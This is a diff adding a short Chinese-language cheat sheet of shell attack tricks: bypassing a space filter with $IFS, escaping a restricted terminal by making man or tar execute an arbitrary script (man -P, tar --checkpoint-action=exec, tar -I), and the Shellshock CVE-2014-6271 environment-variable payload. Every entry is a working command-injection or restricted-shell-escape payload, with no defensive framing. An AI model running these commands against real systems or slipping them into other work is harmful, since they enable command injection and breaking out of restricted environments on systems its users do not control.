@@ -1,0 +1,15 @@
+过滤空格绕过： 
+echo$IFS"1"
+
+突破终端限制执行脚本内容：
+man -P /tmp/runme.sh man
+
+突破终端限制执行脚本中的命令：
+tar cvzf a.tar.gz --checkpoint-action=exec=./a.sh --checkpoint=1 a.sh 
+tar c a.tar -I ./runme.sh a
+
+
+CVE-2014-6271
+env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id 
+
+
